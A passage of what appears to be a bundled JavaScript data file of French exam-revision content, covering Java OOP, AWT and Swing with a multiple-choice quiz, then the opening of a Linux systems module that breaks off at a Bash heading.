 8
 9   // 2. S'auto-désigner comme référence
10   source.addListener(this) ;  // passe l'objet courant
11
12   // 3. Appeler un autre constructeur
13   public Point(double x, double y) { this.x = x ; this.y = y ; }
14   public Point() { this(0, 0) ; }  // appelle Point(double, double)

     ➣ Syntaxe / Code Variables et méthodes statiques (static)

 1   class Vehicule {
 2       static float taxation ;       // partagée entre TOUTES les instances
 3       int age ;                     // propre à chaque instance
 4
 5       static float getTaxation() {
 6           return taxation ;
 7       }
 8       // Attention : une méthode static ne peut PAS utiliser this !
 9   }
10
11   // Accès sans instance, via le nom de la classe
12   Vehicule.taxation = 100.0F ;
13   System.out.println(Vehicule.getTaxation()) ;

     ☞ Attention / Piège
      — Une méthode static ne peut pas utiliser this ni super
      — Une méthode static ne peut accéder qu'aux membres static
      — Un attribut static est partagé : modifier sa valeur affecte toutes les instances`},{id:"13.1",c:13,t:"Classes internes",x:`❖ Définition
     Une classe interne est déclarée à l'intérieur d'une autre classe.
     Il existe 2 types : statique et non-statique.

     ➣ Syntaxe / Code Classe interne statique

 1   public class ClasseExterne {
 2       private int compteur = 0 ;
 3       private static String nom = "exter" ;
 4
 5       static class ClasseInterne {
 6           private int index = 0 ;
 7           public ClasseInterne() {
 8               System.out.println("Création d'un objet " + nom) ;
 9               // ici on ne peut PAS accéder à compteur (non static)
10           }
11       }
12   }
13   // Compilation produit : ClasseExterne.class + ClasseExterne$ClasseInterne.class

     ➣ Syntaxe / Code Classe interne non-statique

 1   public class ClasseExterne {
 2       private int compteur = 10 ;
 3
 4       class ClasseInterne {
 5           private int compteur = 0 ;
 6           public void count() {
 7               this.compteur++ ;                     // compteur interne → 1
 8               ClasseExterne.this.compteur-- ;        // compteur externe → 9
 9           }
10       }
11   }

     ➣ Syntaxe / Code this dans les classes internes

 1   public class Livre {
 2       String titre = "Le livre" ;
 3       class Chapitre {
 4           String titre = "Chapitre 1" ;
 5           public String toString() {
 6               return Livre.this.titre      // "Le livre" (classe externe)
 7                   + "/" +
 8                   this.titre ;             // "Chapitre 1" (classe interne)
 9           }
10       }
11   }

     ★ Astuce Concours
      — Classe interne statique : accède uniquement aux membres static de l'externe
      — Classe interne non-statique : accède à TOUS les membres de l'objet externe
      — NomClasseExterne.this permet d'accéder à l'instance de la classe externe`},{id:"13.2",c:13,t:"Délégation",x:`❖ Définition
     La délégation est une association entre classes où un objet utilise les services d'un autre.
     Un objet o1 (classe C1) délègue une partie de son activité à un objet o2 (classe C2).
     C1 est la classe cliente, C2 est la classe serveuse.

     ➣ Syntaxe / Code Délégation avec référence partagée

 1   public class Cercle {
 2       private Point centre ;           // C1 possède une référence vers C2
 3       private double r ;
 4       public Cercle(Point centre, double r) {
 5           this.centre = centre ;       // référence partagée !
 6           this.r = r ;
 7       }
 8       public void deplace(double dx, double dy) {
 9           centre.deplace(dx, dy) ;     // délègue le déplacement à Point
10       }
11   }
12
13   Point p1 = new Point(10, 0) ;
14   Cercle c1 = new Cercle(p1, 10) ;
15   Cercle c2 = new Cercle(p1, 20) ;
16   c2.deplace(10, 0) ;   // Affecte aussi c1 ! (même Point partagé)
17   // Le centre des 2 cercles est maintenant (20, 0)

     ➣ Syntaxe / Code Délégation avec copie (pas de partage)

 1   public class Cercle {
 2       private Point centre ;
 3       private double r ;
 4       public Cercle(Point centre, double r) {
 5           this.centre = new Point(centre) ;  // copie → pas de partage
 6           this.r = r ;
 7       }
 8   }
 9
10   Point p1 = new Point(10, 0) ;
11   Cercle c1 = new Cercle(p1, 10) ;
12   Cercle c2 = new Cercle(p1, 20) ;
13   c2.deplace(10, 0) ;   // N'affecte que c2 (points indépendants)

     ☞ Attention / Piège
      — Si le Point est partagé, modifier via un cercle affecte TOUS les cercles !
      — Pour éviter cela, faire new Point(centre) dans le constructeur (copie défensive)
      — La délégation est une relation "utilise-un" (vs héritage = "est-un")`},{id:"14.1",c:14,t:"java.lang.Object : toString, equals, clone",x:`❖ Définition
     Object est la superclasse de toutes les classes Java (java.lang.Object).
     Toute classe hérite implicitement de Object et peut utiliser ses méthodes.

     ➣ Syntaxe / Code toString()

 1   // Par défaut : NomClasse@adresseHexa
 2   Salarie sal = new Salarie("Ahmed", 25000) ;
 3   System.out.println(sal) ;     // Salarie@b82e3f203
 4
 5   // Surcharge de toString() pour un affichage utile
 6   public class Salarie {
 7       private String nom ;
 8       private double salaire ;
 9       @Override
10       public String toString() {
11           return "Salarie{nom=" + nom + ", salaire=" + salaire + "}" ;
12       }
13   }
14   System.out.println(sal) ;     // Salarie{nom=Ahmed, salaire=25000}

     ➣ Syntaxe / Code equals()

 1   // Par défaut : compare les ADRESSES (références)
 2   Object o1 = new Point(1, 2) ;
 3   Object o2 = new Point(1, 2) ;
 4   o1.equals(o2) ;     // false ! (adresses différentes)
 5
 6   // Surcharge pour comparer les VALEURS
 7   class Point {
 8       @Override
 9       public boolean equals(Object obj) {
10           if (this == obj) return true ;
11           if (!(obj instanceof Point)) return false ;
12           Point p = (Point) obj ;
13           return (p.x == x) && (p.y == y) ;
14       }
15   }
16   new Point(1,2).equals(new Point(1,2)) ;  // true !

     ➣ Syntaxe / Code clone()

 1   // La classe doit implémenter Cloneable
 2   public class Salarie implements Cloneable {
 3       @Override
 4       public Object clone() throws CloneNotSupportedException {
 5           return super.clone() ;   // copie superficielle
 6       }
 7   }
 8   Salarie s1 = new Salarie("Ahmed", 25000) ;
 9   Salarie s2 = (Salarie) s1.clone() ;   // copie indépendante

     ☞ Attention / Piège
      — equals() de Object compare les références, PAS les valeurs !
      — Toujours redéfinir hashCode() quand on redéfinit equals()
      — clone() fait une copie superficielle : les objets référencés ne sont PAS copiés
      — Sans implements Cloneable → CloneNotSupportedException`},{id:"15.1",c:15,t:"AWT : Conteneurs et composants",x:`❖ Définition
     Une interface graphique Java est un assemblage de conteneurs (Container)
     et de composants (Component). AWT = Abstract Window Toolkit (java.awt).
      — Component : partie visible (boutons, zones de texte, etc.)
      — Container : espace qui contient plusieurs composants (fenêtres, panels)
      — Container hérite de Component → un conteneur est aussi un composant

     ➔ Résumé rapide Conteneurs principaux

      Conteneur     Rôle                                   Layout par défaut

      Frame         Fenêtre avec titre et bordure          BorderLayout
      Panel         Conteneur sans apparence propre        FlowLayout
      Dialog        Fenêtre de dialogue modale             BorderLayout
      Applet        Application dans un navigateur         FlowLayout

     ➣ Syntaxe / Code Créer une interface simple

 1   import java.awt.* ;
 2   public class MaFenetre extends Frame {
 3       public MaFenetre() {
 4           setTitle("Ma première fenêtre") ;
 5           setSize(400, 300) ;
 6
 7           // Ajouter des composants
 8           Panel p = new Panel() ;
 9           Button b = new Button("Cliquer") ;
10           p.add(b) ;          // ajouter bouton au panel
11           add(p) ;            // ajouter panel à la fenêtre
12
13           setVisible(true) ;
14       }
15   }
16   // Retirer un composant : p.remove(b) ;`},{id:"15.2",c:15,t:"Gestionnaires de présentation (Layout)",x:`❖ Définition
     Un gestionnaire de présentation (LayoutManager) gère le positionnement
     et le dimensionnement des composants dans un conteneur.

     ➣ Syntaxe / Code FlowLayout — flux linéaire

 1   // Composants placés les uns après les autres, ligne par ligne
 2   Panel p = new Panel() ;                // FlowLayout par défaut
 3   p.setLayout(new FlowLayout(FlowLayout.LEFT)) ;  // aligné à gauche
 4   p.add(new Button("Bouton 1")) ;
 5   p.add(new Button("Bouton 2")) ;

     ➣ Syntaxe / Code BorderLayout — 5 zones géographiques

 1   // Découpe en 5 zones : North, South, East, West, Center
 2   Frame f = new Frame() ;                // BorderLayout par défaut
 3   f.add("North",  new Button("Haut")) ;
 4   f.add("South",  new Button("Bas")) ;
 5   f.add("East",   new Button("Droite")) ;
 6   f.add("West",   new Button("Gauche")) ;
 7   f.add("Center", new Button("Centre")) ;

     ➣ Syntaxe / Code GridLayout — grille régulière

 1   // Toutes les cellules ont la même taille
 2   Panel p = new Panel() ;
 3   p.setLayout(new GridLayout(3, 2)) ;    // 3 lignes, 2 colonnes
 4   p.add(new Button("1")) ;  // remplissage gauche → droite, haut → bas
 5   p.add(new Button("2")) ;
 6   p.add(new Button("3")) ;

     ★ Astuce Concours
      — FlowLayout : flux, composants les uns après les autres
      — BorderLayout : 5 zones (N/S/E/W/Center), 1 composant par zone
      — GridLayout : grille, toutes les cellules de même taille
      — Pour désactiver le layout : setLayout(null) → positionnement manuel`},{id:"15.3",c:15,t:"Événements graphiques",x:`❖ Définition
     Quand l'utilisateur interagit (clic, touche, etc.), un événement est émis.
     Le composant transmet l'événement à un écouteur (Listener) qui le traite.
     Modèle : Source d'événement → Objet événement → Écouteur

     ➔ Résumé rapide Catégories d'écouteurs

      Listener              Événement            Composants typiques

      ActionListener        Clic bouton, Enter   Button, TextField, Timer
      WindowListener        Fenêtre              Frame (fermeture, icône)
      MouseListener         Clic souris          Tout Component
      MouseMotionListener   Mouvement souris     Tout Component
      KeyListener           Clavier              Tout Component
      ItemListener          Sélection item       Checkbox, Choice, List
      TextListener          Texte modifié        TextField, TextArea
      AdjustmentListener    Curseur              Scrollbar

     ➣ Syntaxe / Code Gérer un clic de bouton

 1   import java.awt.* ;
 2   import java.awt.event.* ;
 3
 4   public class MonApp extends Frame implements ActionListener {
 5       Button btn = new Button("Cliquer") ;
 6
 7       public MonApp() {
 8           btn.addActionListener(this) ;   // enregistrer l'écouteur
 9           add(btn) ;
10           setSize(300, 200) ;
11           setVisible(true) ;
12       }
13
14       // Méthode appelée lors du clic
15       public void actionPerformed(ActionEvent e) {
16           System.out.println("Bouton cliqué !") ;
17       }
18   }

     ★ Astuce Concours
     Pour un composant : addXXXListener() → enregistre l'écouteur
     L'écouteur doit implémenter l'interface correspondante.
     Chaque interface a des méthodes obligatoires (ex: actionPerformed pour ActionListener).
     getX()/getY() sur MouseEvent → coordonnées de la souris.`},{id:"16.1",c:16,t:"Introduction à Swing et MVC",x:`❖ Définition
     Swing (javax.swing) est la bibliothèque graphique moderne de Java, remplaçant AWT.
      — Composants légers (lightweight) vs AWT lourds (heavyweight)
      — Indépendant du gestionnaire de fenêtres natif (look & feel uniforme)
      — Applique le pattern Modèle-Vue-Contrôleur (MVC)

     ◆ Concept clé
     Le schéma MVC décompose un composant graphique en 3 parties :
      — Modèle : les données et l'état courant (ex: texte "Quitter" d'un bouton)
      — Vue : l'apparence graphique (rectangle gris, bordure noire, etc.)
      — Contrôleur : le traitement associé aux événements (clic → fermer la fenêtre)

     ➔ Résumé rapide AWT vs Swing

      Critère         AWT                    Swing

      Package         java.awt               javax.swing
      Poids           Lourd (natif)          Léger (pur Java)
      Look & Feel     OS natif               Personnalisable
      Noms classes    Button, Frame          JButton, JFrame (préfixe J)
      MVC             Non                    Oui
      Performance     Plus rapide            Plus lent mais plus riche

     ➣ Syntaxe / Code Composants top-level Swing

 1   // 3 conteneurs top-level : JFrame, JDialog, JApplet
 2   JFrame frame = new JFrame("Ma fenêtre Swing") ;
 3   frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE) ;
 4   frame.setSize(400, 300) ;
 5
 6   // Ajouter des composants au content pane
 7   Container c = frame.getContentPane() ;
 8   c.add(new JButton("Cliquer")) ;
 9
10   // Barre de menu
11   JMenuBar bar = new JMenuBar() ;
12   frame.setJMenuBar(bar) ;
13
14   frame.setVisible(true) ;`},{id:"16.2",c:16,t:"Composants Swing essentiels",x:`➔ Résumé rapide Composants Swing principaux

      Composant          Rôle                             Équivalent AWT

      JButton            Bouton cliquable                 Button
      JLabel             Étiquette texte/image            Label
      JTextField         Champ de texte 1 ligne           TextField
      JTextArea          Zone de texte multi-lignes       TextArea
      JCheckBox          Case à cocher                    Checkbox
      JRadioButton       Bouton radio                     Checkbox+Group
      JComboBox          Liste déroulante                 Choice
      JList              Liste de sélection               List
      JSlider            Curseur de valeur                Scrollbar
      JProgressBar       Barre de progression             —
      JTree              Arbre hiérarchique               —
      JFileChooser       Sélecteur de fichier             FileDialog
      JColorChooser      Sélecteur de couleur             —

     ➣ Syntaxe / Code Conteneurs intermédiaires

 1   // JPanel : conteneur neutre (FlowLayout par défaut)
 2   JPanel panel = new JPanel() ;
 3   panel.add(new JButton("OK")) ;
 4   panel.setLayout(new GridLayout(2, 2)) ;
 5
 6   // JScrollPane : ascenseurs automatiques
 7   JTextArea text = new JTextArea(10, 30) ;
 8   JScrollPane scroll = new JScrollPane(text) ;
 9
10   // JTabbedPane : onglets
11   JTabbedPane tabs = new JTabbedPane() ;
12   tabs.addTab("Onglet 1", null, panel1, "Tooltip") ;
13   tabs.addTab("Onglet 2", null, panel2, "Tooltip") ;
14
15   // JSplitPane : panneau divisé en deux
16   JSplitPane split = new JSplitPane(
17       JSplitPane.HORIZONTAL_SPLIT, panel1, panel2) ;
18   split.setDividerLocation(0.5) ;

     ➣ Syntaxe / Code Menus Swing

 1   JMenuBar menuBar = new JMenuBar() ;
 2   JMenu menu = new JMenu("Fichier") ;
 3   JMenuItem item = new JMenuItem("Ouvrir") ;
 4   item.addActionListener(e -> System.out.println("Ouvrir !")) ;
 5   menu.add(item) ;
 6   menu.addSeparator() ;
 7   menu.add(new JMenuItem("Quitter")) ;
 8   menuBar.add(menu) ;
 9   frame.setJMenuBar(menuBar) ;

     ★ Astuce Concours
      — Tous les composants Swing commencent par J (JButton, JFrame, etc.)
      — Ajouter les composants au getContentPane() du JFrame
      — JFrame.EXIT_ON_CLOSE ferme l'application à la fermeture de la fenêtre
      — JFileChooser.APPROVE_OPTION indique que l'utilisateur a choisi un fichier`},{id:"16.3",c:16,t:"Composants AWT détaillés",x:`➣ Syntaxe / Code Composants AWT courants

 1   // Button — bouton cliquable
 2   Button b = new Button("Sample") ;
 3   b.addActionListener(e -> System.out.println("Cliqué !")) ;
 4
 5   // Checkbox — case à cocher
 6   Checkbox cb = new Checkbox("Option", false) ;
 7   cb.addItemListener(e -> {
 8       if (e.getStateChange() == ItemEvent.SELECTED)
 9           System.out.println("Coché : " + e.getItem()) ;
10   }) ;
11
12   // CheckboxGroup — boutons radio
13   CheckboxGroup grp = new CheckboxGroup() ;
14   Checkbox r1 = new Checkbox("Option A", grp, true) ;
15   Checkbox r2 = new Checkbox("Option B", grp, false) ;
16
17   // Choice — liste déroulante
18   Choice c = new Choice() ;
19   c.addItem("Premier") ;
20   c.addItem("Deuxième") ;
21   String sel = c.getSelectedItem() ;
22
23   // TextField — champ texte 1 ligne
24   TextField f = new TextField("Texte initial", 30) ;
25   String texte = f.getText() ;
26   f.setText("Nouveau texte") ;
27
28   // TextArea — zone texte multi-lignes
29   TextArea t = new TextArea("Hello", 4, 30,
30       TextArea.SCROLLBARS_BOTH) ;
31   t.append(" World !") ;
32
33   // Label — étiquette non modifiable
34   Label l = new Label("Bonjour !") ;
35
36   // List — liste de sélection
37   List lst = new List(4, false) ;  // 4 lignes visibles, pas de multi-sélection
38   lst.add("Item 1") ;
39   lst.add("Item 2") ;
40
41   // Menu
42   MenuBar mb = new MenuBar() ;
43   Menu menu = new Menu("Fichier") ;
44   MenuItem mi = new MenuItem("Ouvrir") ;
45   mi.addActionListener(e -> System.out.println("Ouvrir")) ;
46   menu.add(mi) ;
47   mb.add(menu) ;
48   // frame.setMenuBar(mb) ;`}],Gf=[{q:`Quelle est la sortie du code suivant ?

1   int a = 5;
2   int b = 2;
3   double c = a / b ;
4   System . out . println ( c ) ;`,o:["2.5","2.0","2","Erreur de compilation"],a:1,e:"Réponse : B) 2.0 a / b est une division entière (int / int = int) = 2. Ensuite, 2 est converti en double lors de l'affectation à c. Résultat : 2.0 Pour obtenir 2.5 : (double)a / b ou a / (double)b ou a / 2.0"},{q:`Quelle est la sortie ?

1   String s1 = " Java " ;
2   String s2 = " Java " ;
3   String s3 = new String ( " Java " ) ;
4   System . out . println ( s1 == s2 ) ;
5   System . out . println ( s1 == s3 ) ;
6   System . out . println ( s1 . equals ( s3 ) ) ;`,o:["true, true, true","true, false, true","false, false, true","true, false, false"],a:1,e:'Réponse : B) true, false, true  s1 == s2 : les littéraux String sont internés → même objet → true  s1 == s3 : new String() crée un nouvel objet → références différentes → false  s1.equals(s3) : compare le contenu → "Java" == "Java" → true Règle : toujours utiliser equals() pour comparer des chaînes, jamais ==.'},{q:`Quelle est la sortie ?

 1   class A {
 2       public String methode () { return " A " ; }
 3   }
 4   class B extends A {
 5       @Override
 6       public String methode () { return " B " ; }
 7   }
 8   class C extends B {
 9       // Pas de redefinition
10   }
11   public class Main {
12       public static void main ( String [] args ) {
13           A obj = new C () ;
14           System . out . println ( obj . methode () ) ;
15       }
16   }`,o:["A","B","C","Erreur de compilation"],a:1,e:`Réponse : B) "B"  Type déclaré : A ; type réel : C  La liaison dynamique (late binding) utilise le type réel  C n'override pas methode(), donc C hérite de B  La méthode appelée est B.methode() → "B"`},{q:"Quelle armation est correcte concernant protected ?",o:["Accessible uniquement depuis la classe elle-même","Accessible depuis la classe, le package, et les sous-classes","Accessible depuis n'importe quelle classe","Accessible uniquement depuis le même package"],a:1,e:"Réponse : B) private package protected public Classe seule Classe + Package Classe + Package + Sous-cl. Tout protected permet l'accès depuis la classe elle-même, les classes du même package, ET les sous- classes (même dans d'autres packages)."},{q:"Quelle armation est FAUSSE ?",o:["Une classe peut implémenter plusieurs interfaces","Une interface peut avoir des méthodes default depuis Java 8","Une classe abstraite peut avoir des constructeurs","Une interface peut être instanciée directement"],a:3,e:"Réponse : D) Une interface peut être instanciée directement  A : Vrai — c'est l'avantage clé des interfaces  B : Vrai — Java 8 a introduit les méthodes default  C : Vrai — les classes abstraites ont des constructeurs (appelés via super())  D : Faux — ni une interface ni une classe abstraite ne peuvent être instanciées directement"},{q:`Quel est le résultat de l'exécution ?

 1   try {
 2       System . out . print ( " 1     ");
 3       if ( true ) throw new          RuntimeException () ;
 4       System . out . print ( " 2     ");
 5   } catch ( Exception e ) {
 6       System . out . print ( " 3     ");
 7   } finally {
 8       System . out . print ( " 4     ");
 9   }
10   System . out . print ( " 5 " ) ;`,o:["1 2 3 4 5","1 3 4 5","1 3 5","1 3 4"],a:1,e:`Réponse : B) 1 3 4 5 1. Print "1" ✓ 2. RuntimeException lancée → "2" ignoré 3. catch(Exception) attrape RuntimeException → print "3" 4. finally s'exécute toujours → print "4" 5. Pas de re-lancement → print "5"`},{q:"Quelle structure est la plus adaptée pour un accès rapide par clé (O(1)) ?",o:["ArrayList","LinkedList","TreeMap","HashMap"],a:3,e:"Réponse : D) HashMap  ArrayList : accès par index O(1), mais pas par clé arbitraire  LinkedList : accès O(n)  TreeMap : accès O(log n) mais clés triées  HashMap : accès O(1) en moyenne (table de hachage) ✓ TreeMap est utile quand on veut les clés en ordre trié."},{q:`Quelle ligne provoque une erreur de compilation ?

1   List < Integer > li = new ArrayList < >() ;
2   List < Number > ln = new ArrayList < >() ;
3   List < Object > lo = new ArrayList < >() ;
5   li . add (42) ;             //   Ligne   A
6   ln = li ;                   //   Ligne   B
7   lo . add ( " hello " ) ;    //   Ligne   C
8   li . add (3.14) ;           //   Ligne   D`,o:["A et C","B et D","B seulement","D seulement"],a:1,e:"Réponse : B) B et D  A : OK — int 42 autoboxing en Integer  B : Erreur — List<Integer> n'est PAS un sous-type de List<Number> (invariance des génériques)  C : OK — List<Object> accepte n'importe quel objet  D : Erreur — 3.14 est un double/Double, pas un Integer Pour B : utiliser List<? extends Number> pour accepter List<Integer>."},{q:`Que retourne le code suivant ?

1   List < Integer > nums = Arrays . asList (1 , 2 , 3 , 4 , 5 , 6) ;
2   int resultat = nums . stream ()
3        . filter ( n -> n % 2 == 0)
4        . mapToInt ( Integer :: intValue )




 5       . sum () ;
 6   System . out . println ( resultat ) ;`,o:["21","12","6","2"],a:1,e:"Réponse : B) 12 1. filter(n -> n % 2 == 0) : garde 2, 4, 6 2. mapToInt : convertit en IntStream 3. sum() : 2 + 4 + 6 = 12"},{q:`Quelle est la sortie ?

 1   public class Compteur {
 2       static int n = 0;
 3       int id ;
 5            Compteur () { n ++; id = n ; }
 6   }
 8   public class Main {
 9       public static void main ( String [] args ) {
10           Compteur c1 = new Compteur () ;
11           Compteur c2 = new Compteur () ;
12           Compteur c3 = new Compteur () ;
13           System . out . println ( c1 . id + " " + c2 . id + " " + Compteur . n ) ;
14       }
15   }`,o:["1 2 2","1 2 3","0 1 3","1 1 3"],a:1,e:"Réponse : B) 1 2 3 n est statique (partagé). À chaque construction : n++, id=n.  c1 : n=1, id=1  c2 : n=2, id=2  c3 : n=3, id=3 c1.id=1, c2.id=2, Compteur.n=3."},{q:"Pour quelle opération LinkedList est-elle plus ecace qu'ArrayList ?",o:["Accès aléatoire par index","Insertion en début de liste","Recherche par valeur","Itération séquentielle"],a:1,e:"Réponse : B) Insertion en début de liste Opération ArrayList LinkedList Accès par index O(1) O(n) Insertion en début O(n) (décalage) O(1) Insertion en fin O(1) amorti O(1) Recherche O(n) O(n) Itération O(n) O(n) 12 | Examen Blanc 2 — Java Avancé"},{q:`Quelle est la sortie ?

 1   class Parent {
 2       Parent () { System . out . print ( " P " ) ; }
 3       Parent ( int x ) { System . out . print ( " P " + x + " " ) ; }
 4   }
 5   class Enfant extends Parent {
 6       Enfant () {
 7           super (5) ;
 8           System . out . print ( " E " ) ;
 9       }
10   }
11   new Enfant () ;`,o:["E P5","P5 E","P E","P5"],a:1,e:`Réponse : B) P5 E Le constructeur de Enfant appelle super(5) en premier → Parent(5) s'exécute → ache "P5". Ensuite, le corps de Enfant() s'exécute → ache "E". Règle : le constructeur parent s'exécute AVANT le corps du constructeur enfant.`},{q:`Combien de fois le stream est-il exécuté dans ce code ?

1   Stream < Integer > s = List . of (1 ,2 ,3 ,4 ,5) . stream ()
2        . filter ( n -> n > 2) ;
3   // ( aucune operation terminale ici )`,o:["5 fois (une par élément)","3 fois (5-2 filtrés)","0 fois (pas d'opération terminale)","1 fois"],a:2,e:"Réponse : C) 0 fois Les Streams Java sont lazy (paresseux) : les opérations intermédiaires (filter, map...) ne s'exécutent que quand une opération terminale est appelée (collect, forEach, count...). Sans opération terminale, rien n'est évalué."},{q:`Quelle est la sortie ?

 1   Integer a = 127;
 2   Integer b = 127;
 3   Integer c = 128;
 4   Integer d = 128;
 5   System . out . println ( a == b ) ;
 6   System . out . println ( c == d ) ;`,o:["true, true","true, false","false, false","false, true"],a:1,e:"Réponse : B) true, false Java cache les Integer de -128 à 127 (JVM Integer cache). Integer a = 127 et Integer b = 127 pointent vers le même objet → a == b est true. Integer c = 128 crée un nouvel objet (hors cache) → c == d est false. Toujours utiliser a.equals(b) pour comparer des Integer !"},{q:`Quelle est la valeur finale de compteur après l'exécution ?

 1   class Exemple {
 2       int compteur = 0;
 4        void incrementer () { // PAS synchronise
 5            for ( int i = 0; i < 1000; i ++) {
 6                compteur ++;
 7            }
 8        }
 9   }
10   Exemple e = new Exemple () ;
11   Thread t1 = new Thread ( e :: incrementer ) ;
12   Thread t2 = new Thread ( e :: incrementer ) ;
13   t1 . start () ; t2 . start () ;
14   t1 . join () ; t2 . join () ;
15   System . out . println ( e . compteur ) ;`,o:["Toujours 2000","Toujours 1000","Une valeur entre 1000 et 2000 (non déterministe)","Le programme plante avec une exception"],a:2,e:"Réponse : C) Valeur non déterministe entre 1000 et 2000 compteur++ n'est pas atomique : c'est 3 opérations (read, increment, write). Sans synchronisation, les deux threads peuvent lire la même valeur et écrire le même résultat → race condition. Solution : synchronized void incrementer() ou AtomicInteger compteur."},{q:"Quelle est la bonne façon de comparer le contenu de deux objets String en Java ?",o:["s1 == s2","s1.equals(s2)","s1.compare(s2)","String.compare(s1, s2)"],a:1,e:"equals() compare le contenu des objets. == compare les références (adresses mémoire), pas les valeurs."},{q:"Que se passe-t-il si on ne définit aucun constructeur dans une classe Java ?",o:["Erreur de compilation","Java fournit un constructeur par défaut sans paramètres","La classe ne peut pas être instanciée","Il faut obligatoirement en définir un"],a:1,e:"Si aucun constructeur n'est défini, le compilateur Java génère automatiquement un constructeur par défaut sans paramètres."},{q:"Quelle instruction doit toujours être la première dans un constructeur de classe dérivée ?",o:["this()","super()","new()","init()"],a:1,e:"L'appel au constructeur de la superclasse super() doit être la première instruction. Si absent, Java l'insère implicitement."},{q:"Quel modificateur d'accès permet l'accès uniquement dans la même classe ?",o:["public","protected","default","private"],a:3,e:"private est le plus restrictif : l'élément est accessible uniquement depuis l'intérieur de la classe où il est défini."},{q:"Qu'est-ce que la délégation en POO ?",o:["Un objet hérite d'un autre","Un objet utilise les services d'un autre objet","Une classe implémente une interface","Un objet est cloné"],a:1,e:"La délégation est quand un objet o1 fait appel à un autre objet o2 pour réaliser une partie de son travail. C'est une relation 'utilise-un'."},{q:"Que retourne toString() de la classe Object par défaut ?",o:["Le contenu de l'objet","NomClasse@adresseHexa","null","Le type de l'objet"],a:1,e:"Object.toString() retourne NomClasse@adresseHexadécimale. Il faut la surcharger pour un affichage utile."},{q:"Quelle interface faut-il implémenter pour rendre une classe clonable ?",o:["Serializable","Comparable","Cloneable","Copyable"],a:2,e:"L'interface Cloneable (sans méthode) autorise l'appel à clone(). Sans elle, CloneNotSupportedException est levée."},{q:"Quel est le layout manager par défaut d'un Frame ?",o:["FlowLayout","BorderLayout","GridLayout","Aucun"],a:1,e:"Frame et Window utilisent BorderLayout par défaut. Panel et Applet utilisent FlowLayout."},{q:"Quel préfixe distingue les composants Swing des composants AWT ?",o:["S (SButton)","Sw (SwButton)","J (JButton)","X (XButton)"],a:2,e:"Tous les composants Swing sont préfixés par J : JButton, JFrame, JPanel, JTextField, etc."},{q:"Dans le pattern MVC, que contient le Modèle ?",o:["L'apparence graphique","Les données et l'état courant","Le traitement des événements","La mise en page"],a:1,e:"Le Modèle contient les données et l'état. La Vue = apparence graphique. Le Contrôleur = traitement des événements."},{q:"Que fait 'MaClasse m2 = m1;' en Java ?",o:["Crée une copie de m1","m2 pointe vers le même objet que m1","Erreur de compilation","Crée un nouvel objet vide"],a:1,e:"En Java, m2 = m1 copie la RÉFÉRENCE, pas l'objet. m1 et m2 pointent vers le même objet. Pour copier, utiliser clone()."},{q:"Quelle est la classe mère de TOUTES les classes en Java ?",o:["System","Main","Object","Class"],a:2,e:"java.lang.Object est la superclasse implicite de toutes les classes. Toute classe hérite directement ou indirectement de Object."},{q:"Une classe interne statique peut accéder à quels membres de la classe externe ?",o:["Tous les membres","Seulement les membres statiques","Seulement les membres publics","Aucun membre"],a:1,e:"Une classe interne statique ne peut accéder qu'aux membres static de sa classe externe. Une classe interne non-statique accède à tous."},{q:"Quel package Java est importé automatiquement sans instruction import ?",o:["java.util","java.io","java.lang","javax.swing"],a:2,e:"java.lang est automatiquement importé. C'est pourquoi on utilise String, Math, System, Integer sans import."},{q:"Quelle méthode de l'interface ActionListener traite un clic de bouton ?",o:["onClick()","handleEvent()","actionPerformed()","buttonClicked()"],a:2,e:"actionPerformed(ActionEvent e) est la seule méthode de l'interface ActionListener, appelée lors d'un clic."}],F2={id:Vf,name:_f,color:Hf,sections:zf,quiz:Gf},k2=Object.freeze(Object.defineProperty({__proto__:null,color:Hf,default:F2,id:Vf,name:_f,quiz:Gf,sections:zf},Symbol.toStringTag,{value:"Module"})),Xf="linux",Qf="Systèmes & Linux",Wf="#22d3ee",$f=[{id:"1.1",c:1,t:"Introduction aux systèmes d'exploitation",x:`❖ Définition
     Un système d'exploitation (OS) est un logiciel système qui gère les ressources matérielles
     et logicielles d'un ordinateur. Il fournit une interface entre l'utilisateur et le matériel.
      Fonctions principales :
       — Gestion des processus (création, ordonnancement, terminaison)
       — Gestion de la mémoire (RAM, mémoire virtuelle, pagination)
       — Gestion des fichiers (systèmes de fichiers, droits)
       — Gestion des E/S (périphériques, drivers)
       — Sécurité et protection (utilisateurs, permissions)

     ➔ Résumé rapide Types de systèmes d'exploitation

      Type              Exemples                   Caractéristiques

      Monolithique      Linux, Unix               Noyau unique, toutes fonctions en kernel space
      Micro-noyau       Minix, QNX                Noyau minimal, services en user space
      Hybride           Windows NT, macOS         Combinaison monolithique + micro-noyau
      Temps réel        FreeRTOS, VxWorks         Garanties temporelles strictes
      Embarqué          Android, Tizen            Adapté aux appareils mobiles/IoT

     ◆ Concept clé
     Le noyau (kernel) est le cœur de l'OS. Il s'exécute en mode privilégié (kernel mode)
     et gère directement le matériel. Les applications s'exécutent en mode utilisateur (user mode)
     et communiquent avec le noyau via des appels système (syscalls).`},{id:"1.2",c:1,t:"Architecture Linux et distributions",x:`❖ Définition
     Linux est un noyau (kernel) de système d'exploitation créé par Linus Torvalds en 1991.
     Une distribution Linux = Noyau Linux + Outils GNU + Gestionnaire de paquets + Bureau.

     ➔ Résumé rapide Distributions Linux populaires

      Distribution     Base         Paquets        Usage

      Ubuntu           Debian       apt/deb        Bureau, serveur, débutants
      Debian           —            apt/deb        Serveur, stabilité
      Fedora           Red Hat      dnf/rpm        Desktop, innovations
      CentOS/Rocky     RHEL         yum/rpm        Serveur entreprise
      Arch Linux       —            pacman         Avancé, rolling release
      Kali Linux       Debian       apt/deb        Sécurité, pentesting
      Alpine           —            apk            Conteneurs Docker

     ➔ Résumé rapide Architecture Linux

      Couche              Rôle

      Matériel            CPU, RAM, disques, périphériques
      Noyau (Kernel)      Gestion matériel, processus, mémoire, fichiers
      Shell               Interface ligne de commande (Bash, Zsh)
      Utilitaires GNU     Commandes de base (ls, cp, grep, etc.)
      Applications        Logiciels utilisateur (Firefox, LibreOffice, etc.)

     ★ Astuce Concours
     Linux suit la philosophie Unix :
      — Tout est fichier (périphériques, processus, sockets)
      — Chaque programme fait une seule chose bien
      — Les programmes communiquent via des flux de texte (pipes)`},{id:"1.3",c:1,t:"Le Shell et Bash",x:`❖ Définition
     Le Shell est l'interpréteur de commandes de Linux. Bash (Bourne Again Shell) est le
     shell le plus courant. Il interprète les commandes saisies par l'utilisateur et les
     transmet au noyau.

     ➣ Syntaxe / Code Bases du Shell Bash

